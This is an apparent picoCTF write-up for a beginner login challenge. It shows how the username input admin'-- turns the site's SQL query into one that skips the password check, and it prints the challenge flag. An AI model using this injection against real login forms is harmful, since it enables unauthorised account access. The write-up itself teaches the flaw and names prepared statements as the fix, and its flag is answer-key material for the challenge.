## 🐱 Description  
Can you login to this website?  

**Hint:** The user you want to login as is `admin`.  

---

## 🚀 Step-by-Step Approach 

### 🔹 Step 1: Open the Website  
When you open the challenge, you’ll see a simple **login form**:  
- Username  
- Password  

Looks normal, right? Let’s poke around 👀  

---

### 🔹 Step 2: First Test  
Try this:  
```
Username: admin
Password: 1234
```

The site responds with something like:  
```
username: admin
password: 1234
SQL query: SELECT * FROM users WHERE name='admin' AND password='1234'
Login failed.
```

👉 Notice: It shows us the exact **SQL query** being run!  

---

### 🔹 Step 3: Understand the Query  
The query is:  
```sql
SELECT * FROM users WHERE name='admin' AND password='1234';
```

- It checks if there’s a row with `name = 'admin'` **AND** `password = '1234'`.  
- Since we don’t know the right password → **Login failed**.  

---

### 🔹 Step 4: Think Like a Hacker 🕵️  
What if we can **skip the password check**?  

In SQL:  
- `--` = comment.  
- Everything after `--` is ignored.  

So if we enter:  
```
Username: admin'--
Password: anything
```

The query becomes:  
```sql
SELECT * FROM users WHERE name='admin'--' AND password='anything';
```

👉 The password part is ignored.  
👉 Now the query is just:  
```sql
SELECT * FROM users WHERE name='admin';
```

💡 No password required!  

---

### 🔹 Step 5: Success 🎉  
Now the site says:  
```
Logged in! 
But can you see the flag, it is in plain sight.
```

---

### 🔹 Step 6: Where’s the Flag?  
The flag isn’t on the page directly. The hint says **in plain sight**.  

👉 Right-click → **View Page Source (Ctrl+U)**.  
👉 Inside the HTML code, you’ll find the flag hidden as a comment.

## 🏁 Final Flag  
```
picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}
```

## 📚 Beginner Takeaways  
✅ **SQL Injection** = tricking a website into running unintended SQL.  
✅ `--` = comment, helps bypass parts of a query.  
✅ Always inspect the **page source** for hidden clues.  
✅ Real websites prevent this with **prepared statements** & **input sanitization**.
